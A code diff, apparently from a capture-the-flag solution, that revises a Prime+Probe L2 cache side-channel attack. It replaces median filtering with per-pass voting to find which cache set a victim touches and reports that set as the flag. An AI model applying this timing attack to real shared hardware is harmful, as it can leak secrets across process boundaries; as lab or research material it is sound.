@@ -76,34 +76,32 @@ uint64_t probe_set(int set_index) {
     return end - start;
 }
 
-// Structure to store results for sorting
+// Structure to store results for sorting within a pass
 typedef struct {
     int set_index;
-    uint64_t median_latency;
-} Result;
+    uint64_t latency;
+} PassResult;
 
-int compare_results(const void *a, const void *b) {
-    Result *r1 = (Result *)a;
-    Result *r2 = (Result *)b;
-    // Sort descending by latency
-    if (r2->median_latency > r1->median_latency) return 1;
-    if (r2->median_latency < r1->median_latency) return -1;
+// Structure to store final scores
+typedef struct {
+    int set_index;
+    int score;
+} FinalScore;
+
+int compare_pass_results(const void *a, const void *b) {
+    PassResult *r1 = (PassResult *)a;
+    PassResult *r2 = (PassResult *)b;
+    if (r2->latency > r1->latency) return 1;
+    if (r2->latency < r1->latency) return -1;
     return 0;
 }
 
-// Helper to find median of an array
-uint64_t find_median(uint64_t *arr, int n) {
-    // Simple bubble sort for small n
-    for (int i = 0; i < n-1; i++) {
-        for (int j = 0; j < n-i-1; j++) {
-            if (arr[j] > arr[j+1]) {
-                uint64_t temp = arr[j];
-                arr[j] = arr[j+1];
-                arr[j+1] = temp;
-            }
-        }
-    }
-    return arr[n/2];
+int compare_final_scores(const void *a, const void *b) {
+    FinalScore *r1 = (FinalScore *)a;
+    FinalScore *r2 = (FinalScore *)b;
+    if (r2->score > r1->score) return 1;
+    if (r2->score < r1->score) return -1;
+    return 0;
 }
 
 int main(int argc, char const *argv[]) {
@@ -124,47 +122,66 @@ int main(int argc, char const *argv[]) {
         build_set(i);
     }
 
-    printf("Scanning L2 sets (using median filtering)...\n");
+    printf("Scanning L2 sets (Voting/Mode Method)...\n");
 
-    // Store measurements for all sets across all passes
-    // 1024 sets, 5 passes
-    #define PASSES 5
-    uint64_t measurements[1024][PASSES];
+    int scores[1024] = {0};
+    
+    // Parameters
+    int total_passes = 100;
+    int samples_per_pass = 200;
+    int top_n_per_pass = 3; // Vote for top 3 in each pass
 
-    int samples = 1000; // High sample count for stability
+    PassResult pass_results[1024];
 
-    for (int p = 0; p < PASSES; p++) {
-        printf("Pass %d/%d...\n", p+1, PASSES);
+    for (int p = 0; p < total_passes; p++) {
+        if (p % 10 == 0) {
+            printf("Pass %d/%d...\n", p+1, total_passes);
+            fflush(stdout);
+        }
+
+        // 1. Measure all sets
         for (int i = 0; i < 1024; i++) {
             uint64_t total_latency = 0;
-            
-            for (int k = 0; k < samples; k++) {
+            for (int k = 0; k < samples_per_pass; k++) {
                 prime_set(i);
-                // Wait a bit for victim to access
-                for(volatile int w=0; w<1000; w++);
+                for(volatile int w=0; w<2000; w++); // Wait
                 total_latency += probe_set(i);
             }
-            
-            measurements[i][p] = total_latency / samples;
+            pass_results[i].set_index = i;
+            pass_results[i].latency = total_latency / samples_per_pass;
+        }
+
+        // 2. Sort to find top N hottest sets in this pass
+        qsort(pass_results, 1024, sizeof(PassResult), compare_pass_results);
+
+        // 3. Vote
+        for (int i = 0; i < top_n_per_pass; i++) {
+            scores[pass_results[i].set_index]++;
         }
     }
 
-    // Calculate medians
-    Result results[1024];
+    // Prepare final results
+    FinalScore final_results[1024];
     for (int i = 0; i < 1024; i++) {
-        results[i].set_index = i;
-        results[i].median_latency = find_median(measurements[i], PASSES);
+        final_results[i].set_index = i;
+        final_results[i].score = scores[i];
     }
 
-    // Sort results
-    qsort(results, 1024, sizeof(Result), compare_results);
+    // Sort by score (frequency)
+    qsort(final_results, 1024, sizeof(FinalScore), compare_final_scores);
 
-    printf("\nTop 5 High Latency Sets (Median over %d passes):\n", PASSES);
+    printf("\nTop 5 Most Frequent High-Latency Sets (Max Score: %d):\n", total_passes);
     for (int i = 0; i < 5; i++) {
-        printf("Set %d: %llu cycles\n", results[i].set_index, (unsigned long long)results[i].median_latency);
+        printf("Set %d: Score %d\n", final_results[i].set_index, final_results[i].score);
     }
 
-    printf("\nDetected Flag: %d\n", results[0].set_index);
+    // Heuristic: Pick the winner, but skip Set 0 if it's #1 and #2 is close or significant
+    int detected_flag = final_results[0].set_index;
+    if (detected_flag == 0 && final_results[1].score > (total_passes / 5)) {
+        detected_flag = final_results[1].set_index;
+    }
+
+    printf("\nDetected Flag: %d\n", detected_flag);
     
     return 0;
 }
